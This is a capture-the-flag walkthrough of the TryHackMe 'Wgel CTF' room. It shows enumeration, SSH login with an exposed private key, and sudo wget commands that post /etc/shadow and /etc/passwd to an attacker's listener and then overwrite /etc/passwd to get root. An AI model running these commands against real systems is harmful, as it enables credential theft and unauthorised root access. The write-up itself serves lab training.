# Wgel CTF

**Room Link:** [https://tryhackme.com/room/wgelctf](https://tryhackme.com/room/wgelctf)





## Scanning

### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found.

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>

### TCP/80 - HTTP

On the main page of the site it was just a apache default page but in the source we can see someone named jessie making a comment.

<figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

Ran gobuster and found a site under sitemap, nothing really interesting about it when browsing.

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt 
```

<figure><img src="../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

gobuster wasn't really able to find anything interesting.

**Kali**

```
gobuster dir -u http://$VICTIM/sitemap/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt 
```

<figure><img src="../../.gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

Ran dirb with defaults and it found a .ssh folder which has a id\_rsa so I downloaded and used it.

**Kali**

```
dirb http://$VICTIM/sitemap/
```

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
chmod 600 id_rsa
ssh -v -i id_rsa  jessie@$VICTIM
```

<figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
sudo -l
```

<figure><img src="../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

I tried cracking jessies hash as I would then be able to run any command with sudo but I couldn't crack it, documenting it anyways.

**Victim**

```
sudo -u root /usr/bin/wget --post-file=/etc/shadow $KALI:4444
sudo -u root /usr/bin/wget --post-file=/etc/passwd $KALI:4444
```

**Victim**

```
nc -lvnp 4444
```

**Victim**

```
unshadow passwd.txt shadow.txt > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```



Instead I  changed the passwd file, I first downloaded to kali and changed the line for jessie so their password is now '123'. Then I uploaded it back and just became root.

**Victim**&#x20;

```
sudo -u root /usr/bin/wget --post-file=/etc/passwd 10.10.65.21:4444
```

**Kali**&#x20;

```
nc -lvnp 4444
```

**Line to change**

```
jessie:$1$new$p7ptkEKU1HnaHpRtzNizS1:1000:1000:jessie,,,:/home/jessie:/bin/bash

```

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
python2 -m SimpleHTTPServer 81
```

**Victim**

```
sudo wget http://$KALI:8/passwd -O /etc/passwd
sudo -i
```

<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

